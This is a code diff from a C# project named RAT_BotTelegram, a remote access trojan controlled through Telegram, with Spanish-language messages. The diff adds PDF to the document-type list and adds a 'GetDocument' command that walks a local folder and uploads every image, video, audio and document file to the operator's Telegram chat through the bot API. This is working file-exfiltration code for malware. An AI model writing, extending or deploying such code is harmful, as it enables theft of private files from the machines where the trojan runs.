@@ -214,7 +214,7 @@ namespace RAT_BotTelegram {
 
                 String[] video = { "gif", "mp4", "avi", "div", "m4v", "mov", "mpg", "mpeg", "qt", "wmv", "webm", "flv" };
                 String[] audio = { "midi", "mp1", "mp2", "mp3", "wma", "ogg", "au", "m4a" };
-                String[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx" };
+                String[] doc = { "doc", "docx", "txt", "log", "ppt", "pptx", "pdf" };
                 String[] imagen = { "jpeg", "png", "bmp","ico", "jpe", "jpe" };
                 String[] system = { "ani", "bat", "bfc", "bkf", "blg", "cat", "cer", "cfg", "chm", "chk", "clp", "cmd", "cnf", "com", "cpl", "crl", "crt", "cur", "dat", "db",
                                 "der", "dll", "drv", "ds", "dsn" , "dun","exe","fnd","fng","fon","grp","hlp","ht","inf","ini","ins","isp","job","key","lnk","msi","msp","msstyles",
@@ -282,15 +282,46 @@ namespace RAT_BotTelegram {
 
                 case "GetDocument":
 
-                    string ruta = @"O:\OneDrive - xKx\Pictures\Game resources - Sprites\Lazer o balas\transparent-laser-pixel.oldf";
-                    Console.WriteLine("Nombre: " + GetFileName(ruta) + "\n tipo:" + GetFileType(ruta));
-
                     await Bot.SendTextMessageAsync(config.id, "******************** Start ********************** ");
                     foreach (var file in Tools.GetFile(@"O:\Estoo")) {
                         //FileInfo info = new FileInfo(file);
                         //await Bot.SendTextMessageAsync(config.id, "<| " + file + info + " |>\n" + "https://cenfotec.s3-us-west-2.amazonaws.com/prod/wpattchs/2013/04/web-tec-virtual.pdf");
-                        //await Bot.SendDocumentAsync(config.id, Telegram.Bot.Types.InputFiles.InputOnlineFile file);
                        
+                        
+                        switch (GetFileType(file)) {
+                            case "[Imagen]":
+                                try {
+                                    await Bot.SendPhotoAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                                } catch  {
+                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, "+ GetFileName(file));
+                                }
+                                break;
+                            case "[Video]":
+                                try {
+                                    await Bot.SendVideoAsync(config.id, File.Open(file, FileMode.Open));
+                                } catch (Exception) {
+                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                }
+                                break;
+                            case "[Audio]":
+                                try {
+                                    await Bot.SendAudioAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                                } catch (Exception) {
+                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                }
+                                break;
+                            case "[Doc]":
+                                try {
+                                    await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                                } catch (Exception) {
+                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                }
+                                break;
+                            default:
+                                await Bot.SendTextMessageAsync(config.id, "Se ignoró el archivo " + GetFileName(file));
+                                break;
+                        }
+
                         await Bot.SendTextMessageAsync(config.id, file);
                         //await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open));
                     }
